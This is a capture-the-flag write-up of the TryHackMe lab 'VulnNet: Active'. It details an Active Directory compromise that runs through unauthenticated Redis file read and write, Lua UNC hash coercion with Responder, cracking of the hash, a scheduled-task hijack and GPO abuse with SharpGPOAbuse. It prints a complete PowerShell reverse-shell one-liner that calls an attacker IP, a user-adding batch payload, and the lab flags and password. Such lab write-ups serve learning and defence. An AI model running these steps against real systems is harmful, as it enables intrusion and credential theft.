# TryHackMe — VulnNet: Active

**Room:** VulnNet: Active | **Difficulty:** Medium | **OS:** Windows / Active Directory
**Author:** @SkyWaves
**Tags:** `Active Directory` `Redis` `Lua Scripting` `NetNTLM` `Responder` `Scheduled Task Hijack` `BloodHound` `GenericWrite` `GPO Abuse` `SharpGPOAbuse`

---

## ![Room Banner](./assets/2.png)

---

## Overview

A Windows Active Directory engagement starting from zero credentials against a domain member server. The attack chain exploits an unauthenticated Redis instance to read files and coerce a NetNTLMv2 hash via Lua scripting, cracks the credentials offline, then abuses a writable scheduled task script for initial access. Privilege escalation is achieved through a BloodHound-discovered `GenericWrite` ACL over a domain-linked GPO, weaponised with SharpGPOAbuse.

---

## Phase 1 — Reconnaissance

### Nmap Full-Port Scan

Full port scan to avoid missing services on non-standard high ports.

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ nmap -Pn -p- -A -T4 -vv -oN nmap.txt 10.114.179.221
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
...

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

**Reading the scan by what's missing:** Port 88 (Kerberos), 389/636 (LDAP), and 3268/3269 (Global Catalog) are all absent. This is not a Domain Controller — it is a domain member server. That immediately eliminates DCSync, Kerberoasting, AS-REP Roasting, and any LDAP-based enumeration against this host.

SMB signing is required, ruling out relay attacks. SMBv3.1.1 eliminates EternalBlue.

What stands out instead is **port 6379 — Redis 2.8.2402**. That version is outdated, and it is exposed with no authentication. This is the primary attack surface.

---

## Phase 2 — SMB Enumeration

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ enum4linux-ng 10.114.179.221 -A
```

```
[+] Found domain information via SMB
NetBIOS computer name: VULNNET-BC3TCK1
NetBIOS domain name: VULNNET
DNS domain: vulnnet.local
FQDN: VULNNET-BC3TCK1SHNQ.vulnnet.local
Derived membership: domain member

[+] Server allows authentication via username '' and password ''
[-] Could not establish guest session: STATUS_LOGON_FAILURE

[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
[-] Could not get groups: STATUS_ACCESS_DENIED
[+] Found 0 shares for user '' with password ''
[-] SMB connection error: STATUS_ACCESS_DENIED
```

```
10.114.179.221    VULNNET-BC3TCK1SHNQ.vulnnet.local  vulnnet.local  VULNNET-BC3TCK1
```

Anonymous bind succeeds and leaks the domain name, FQDN, and domain SID. Every deeper RPC call — users, groups, shares, policies — returns `STATUS_ACCESS_DENIED`. RID brute-force hits the same wall:

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ nxc smb 10.114.179.221 -u '' -p '' --rid-brute 2000
SMB  10.114.179.221  445  VULNNET-BC3TCK1  [+] vulnnet.local\: (Null Auth:True)
SMB  10.114.179.221  445  VULNNET-BC3TCK1  [-] Error: STATUS_ACCESS_DENIED
```

`POLICY_LOOKUP_NAMES` and `SAMR_ENUM_USERS` rights are explicitly denied to anonymous tokens. The SMB surface is exhausted. Pivoting to Redis.

---

## Phase 3 — Redis: Unauthenticated Access & Arbitrary File Write

### Establishing Access

Redis is an in-memory key-value store that can persist data to disk via an RDB dump file. The critical property of this version: it accepts `CONFIG SET` commands to redirect both the **output directory** and the **output filename** of that dump — meaning any authenticated client can write arbitrary content to arbitrary paths. On this instance, there is no authentication at all.

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ redis-cli -h 10.114.179.221
```

```
10.114.179.221:6379> CONFIG GET *
...
  3) "requirepass"
  4) ""                        <- no password, wide open
...
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
...

10.114.179.221:6379> KEYS *
(empty array)
```

Two key findings: `requirepass` is empty (unauthenticated access confirmed), and the working directory reveals the Redis process is running as the domain account **enterprise-security**. Any path writable by that account is reachable.

### Startup Folder File Write (Rabbit Hole)

The most direct abuse target is the Windows Startup folder — `.bat` files placed at `C:\Users\enterprise-security\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` execute automatically at logon.

```
CONFIG SET dir "C:\\Users\\enterprise-security\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
CONFIG SET dbfilename "update.bat"
SET payload "@echo off
net user new_user Password123! /add
net localgroup administrators new_user /add"
SAVE
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ crackmapexec smb 10.114.179.221 -u new_user -p Password123!
SMB  10.114.179.221  445  VULNNET-BC3TCK1  [-] vulnnet.local\Taher:Password123! STATUS_LOGON_FAILURE
```

The payload was written successfully but never executed — this lab environment does not auto-restart to trigger Startup items. The arbitrary file write primitive is real; it just needs a better execution trigger.

---

## Phase 4 — Redis Lua: Local File Read → Flag 1

Redis 2.8 ships with a built-in Lua scripting engine accessible via `EVAL`. The `dofile()` function attempts to read and execute a file as Lua code. When the target file is not valid Lua, Redis raises an error — and that error message **leaks the first line of the file content**.

```
10.114.179.221:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
(error) ERR Error running script: @user_script:1: C:/Users/enterprise-security/Desktop/user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
```

**Flag 1:** `THM{3eb176aee96432d5b100bc93580b291e}`

The Lua sandbox in this Redis version does not restrict filesystem access. `dofile()` reads local paths freely, and the error handler inadvertently exfiltrates the file content.

---

## Phase 5 — Redis Lua: UNC Path Coercion → NetNTLMv2 Hash Capture

The same `dofile()` primitive can point at a **UNC path** instead of a local file. When Redis attempts to open `\\<attacker_ip>\share`, Windows' networking stack automatically initiates NTLM authentication — sending the service account's NetNTLMv2 challenge-response to whoever is listening.

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ sudo responder -I tun0
```

```
10.114.179.221:6379> EVAL "dofile('//192.168.129.39/something')" 0
(error) ERR Error running script: @user_script:1: cannot open //192.168.129.39/something: Permission denied
```

The connection error is expected — what matters is what Responder captured:

```
[SMB] NTLMv2-SSP Client   : 10.114.179.221
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:d13c2d328e0bf186:13E72171C014BE42117E6CA67F5A5B98:0101000000000000...
```

> **Note:** This is a **NetNTLMv2 challenge-response**, not an NTLM hash. Pass-the-Hash is not possible. NTLM relay is also off the table due to SMB signing. Offline cracking is the only viable path.

### Cracking the Hash

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt enterprise.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 5 OpenMP threads

sand_0873959498  (enterprise-security)
1g 0:00:00:01 DONE — 2676Kp/s
```

Password for `enterprise-security`: `sand_0873959498`

---

## Phase 6 — SMB Enumeration & Scheduled Task Hijack

### Share Enumeration

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ crackmapexec smb 10.114.179.221 -u enterprise-security -p sand_0873959498 --shares
SMB  10.114.179.221  445  VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
SMB  10.114.179.221  445  VULNNET-BC3TCK1  Share           Permissions   Remark
SMB  10.114.179.221  445  VULNNET-BC3TCK1  -----           -----------   ------
SMB  10.114.179.221  445  VULNNET-BC3TCK1  ADMIN$                        Remote Admin
SMB  10.114.179.221  445  VULNNET-BC3TCK1  C$                            Default share
SMB  10.114.179.221  445  VULNNET-BC3TCK1  Enterprise-Share  READ
SMB  10.114.179.221  445  VULNNET-BC3TCK1  IPC$            READ          Remote IPC
SMB  10.114.179.221  445  VULNNET-BC3TCK1  NETLOGON        READ          Logon server share
SMB  10.114.179.221  445  VULNNET-BC3TCK1  SYSVOL          READ          Logon server share
```

No write access to `ADMIN$`, so `psexec.py` and `wmiexec.py` are off the table. RDP and WinRM are also not exposed. The `Enterprise-Share` is the only accessible non-default share.

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
smb: \> ls
  PurgeIrrelevantData_1826.ps1    A    69    Wed Feb 24 01:33:18 2021

smb: \> get PurgeIrrelevantData_1826.ps1
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ cat PurgeIrrelevantData_1826.ps1
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

A cleanup script — the naming convention and task structure indicate this runs on a schedule.

### Share vs NTFS Permissions

CrackMapExec reported only `READ` on `Enterprise-Share`. This reflects the **share-level ACL** only. Windows enforces two independent permission layers: the share ACL and the underlying NTFS ACL. A user can have `READ` at the share boundary but `Modify` or `Full Control` at the NTFS level. Testing directly:

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ echo 'test' > test

┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
smb: \> put test
putting file test as \test
smb: \> ls
  PurgeIrrelevantData_1826.ps1    A    69
  test                            A     5
```

Write access confirmed. The NTFS permissions are more permissive than the share ACL indicated.

### Injecting the Reverse Shell

Replacing the legitimate scheduled task script with a PowerShell reverse shell:

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ cat > PurgeIrrelevantData_1826.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('192.168.129.39',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.129.39] from (UNKNOWN) [10.114.179.221] 49745

PS C:\Users\enterprise-security\Downloads> whoami
vulnnet\enterprise-security

PS C:\Users\enterprise-security\Desktop> type C:\Users\enterprise-security\Desktop\user.txt
THM{3eb176aee96432d5b100bc93580b291e}
```

Shell established as `enterprise-security`. Flag 1 confirmed via filesystem.

---

## Phase 7 — BloodHound & GPO Abuse → Domain Admin

### Domain Data Collection with SharpHound

```bash
┌──(kali㉿kali)-[/opt]
└─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
smb: \> put SharpHound.ps1
putting file SharpHound.ps1 as \SharpHound.ps1 (1573.5 kB/s)
```

```powershell
PS C:\Enterprise-Share> Import-Module .\SharpHound.ps1
PS C:\Enterprise-Share> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Enterprise-Share
PS C:\Enterprise-Share> ls

    Directory: C:\Enterprise-Share

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/19/2026   9:40 AM          11407 20260419094020_BloodHound.zip
-a----        4/19/2026   9:24 AM            504 PurgeIrrelevantData_1826.ps1
-a----        4/19/2026   9:35 AM        1308348 SharpHound.ps1
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient //10.114.179.221/Enterprise-Share -U vulnnet.local/enterprise-security%sand_0873959498
smb: \> prompt off
smb: \> get 20260419094020_BloodHound.zip
```

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ sudo neo4j start

┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
```

### ACL Analysis

Upload the zip, mark `enterprise-security` as owned, and query the shortest path to Domain Admins from owned principals.

## ![BloodHound Graph](./assets/1.png)

`enterprise-security` holds **GenericWrite** over the GPO `SECURITY-POL-VN`, which is linked directly to the `VULNNET.LOCAL` domain. GenericWrite on a GPO grants the ability to modify its contents — including injecting a new Immediate Scheduled Task. Since GPOs apply to all computer objects in scope, a malicious task pushed through this GPO executes on affected machines under a privileged context, making this a domain-wide escalation path from a single user-level permission.

### Exploiting GenericWrite with SharpGPOAbuse

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe

┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient //10.114.179.221/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'put SharpGPOAbuse.exe'
```

```powershell
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"

[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{...}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

Force immediate GPO application rather than waiting for the default refresh interval:

```powershell
PS C:\Enterprise-Share> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

### Confirming Local Admin

```powershell
PS C:\Enterprise-Share> net user enterprise-security

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

---

## Phase 8 — Final Flag

The existing reverse shell retains the security token from the original logon session — group membership changes do not apply until a new token is issued. Rather than spawning a new shell, the `C$` administrative share can be accessed directly over SMB using the now-elevated credentials:

```bash
┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ smbclient '//10.114.179.221/C$' -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'cd Users\Administrator\Desktop; get system.txt; exit'

┌──(kali㉿kali)-[~/Writeups/VulnNet: Active]
└─$ cat system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
```

**Flag 2 (System):** `THM{d540c0645975900e5bb9167aa431fc9b}`

---

## Attack Chain Summary

| Phase                 | Technique                                      | Outcome                                                            |
| --------------------- | ---------------------------------------------- | ------------------------------------------------------------------ |
| Reconnaissance        | Nmap full-port scan                            | Domain member server identified; Redis 2.8 exposed unauthenticated |
| SMB Enumeration       | Null session, RID brute                        | Domain name/FQDN leaked; no user enumeration possible              |
| Redis — File Write    | `CONFIG SET dir/dbfilename` + `SAVE`           | Arbitrary file write primitive confirmed                           |
| Redis — File Read     | `EVAL dofile()` (Lua)                          | Flag 1 read via error message leak                                 |
| Redis — Hash Coercion | `EVAL dofile('//attacker_ip/...')` + Responder | NetNTLMv2 hash for `enterprise-security` captured                  |
| Hash Cracking         | John the Ripper (rockyou)                      | `enterprise-security` password recovered                           |
| Share Enumeration     | CrackMapExec + smbclient                       | `Enterprise-Share` identified; NTFS write confirmed                |
| Scheduled Task Hijack | PowerShell reverse shell replacing `.ps1`      | Shell as `enterprise-security`                                     |
| Domain Mapping        | SharpHound + BloodHound                        | `GenericWrite` over `SECURITY-POL-VN` GPO identified               |
| GPO Abuse             | SharpGPOAbuse `--AddComputerTask`              | `enterprise-security` added to local Administrators                |
| Flag Retrieval        | SMB `C$` access                                | System flag retrieved                                              |

---

## Key Takeaways

The initial access chain here illustrates how a single misconfigured ancillary service can undermine an otherwise hardened AD environment. Redis with no authentication and no network-level restriction is an arbitrary file write and credential coercion primitive by default — the Lua `dofile()` UNC trick is particularly effective because it requires no exploit code, just a single command that triggers Windows' built-in NTLM authentication stack.

The distinction between share-level and NTFS permissions is a practical point worth internalising. Automated tooling reports what the share ACL allows; the NTFS layer is a separate check that can only be confirmed by attempting the action directly. Assuming share permissions are the ceiling is a common enumeration shortcut that leaves real access on the table.

The GPO abuse path demonstrates why `GenericWrite` on a Group Policy Object is frequently underweighted in permission audits. Unlike `GenericAll` on a user, which affects a single account, write access to a GPO with broad scope is a domain-wide escalation primitive — every computer object the policy applies to becomes an execution target. It warrants the same severity classification as direct Domain Admin-adjacent ACLs.

---

_Writeup repository: [https://github.com/MohamedTaherBorgi/Writeups](https://github.com/MohamedTaherBorgi/Writeups)_

**Tags:** `TryHackMe` `Active Directory` `Redis` `Lua Scripting` `NetNTLM` `Responder` `Scheduled Task Hijack` `BloodHound` `GenericWrite` `GPO Abuse` `SharpGPOAbuse`
